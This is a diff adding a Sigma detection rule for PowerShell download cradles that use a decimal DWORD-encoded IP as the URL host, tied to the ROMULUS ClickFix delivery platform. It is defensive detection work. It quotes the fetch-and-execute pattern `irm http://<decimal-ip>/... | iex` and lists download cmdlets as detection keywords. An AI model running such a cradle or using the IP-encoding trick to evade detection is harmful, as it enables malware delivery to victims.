@@ -1,0 +1,49 @@
+title: PowerShell Download From Decimal DWORD IP URL
+id: 42ec30f7-6b11-4df4-a103-0466a2a4a9bc
+status: experimental
+description: |
+    Detects PowerShell download cradles (Invoke-RestMethod, Invoke-WebRequest, their aliases, WebClient) whose URL host is a single 8 to 10 digit decimal number, i.e. an IPv4 address written as a DWORD (http://1450003207/ is 86.109.75.7).
+    The ROMULUS ClickFix delivery platform hands victims `irm http://<decimal-ip>/s/<12 hex> | iex`. Existing rules cover dotted, hexadecimal and octal obfuscated IPs; a plain decimal DWORD host without a leading zero is not matched by them.
+references:
+    - https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
+    - https://blackpointcyber.com/blog/romulus-cncmachinerms/
+    - https://www.forescout.com/blog/romulus-analysis-of-a-new-multi-payload-clickfix-delivery-platform/
+author: Harper Johns
+date: 2026-11-24
+tags:
+    - attack.execution
+    - attack.t1059.001
+    - attack.command-and-control
+    - attack.t1105
+    - attack.stealth
+    - attack.t1027
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith:
+              - '\powershell.exe'
+              - '\pwsh.exe'
+              - '\powershell_ise.exe'
+        - OriginalFileName:
+              - 'PowerShell.EXE'
+              - 'pwsh.dll'
+              - 'powershell_ise.EXE'
+    selection_cmd:
+        CommandLine|contains:
+            - 'Invoke-RestMethod'
+            - 'Invoke-WebRequest'
+            - 'irm '
+            - 'iwr '
+            - 'curl '
+            - 'wget '
+            - 'DownloadString'
+            - 'DownloadFile'
+            - 'DownloadData'
+    selection_ip:
+        CommandLine|re: 'https?://[0-9]{8,10}(?::[0-9]{1,5})?(?:[/\\s"'']|$)'
+    condition: all of selection_*
+falsepositives:
+    - Unlikely. Software that deliberately uses DWORD-encoded IP addresses in download URLs.
+level: high
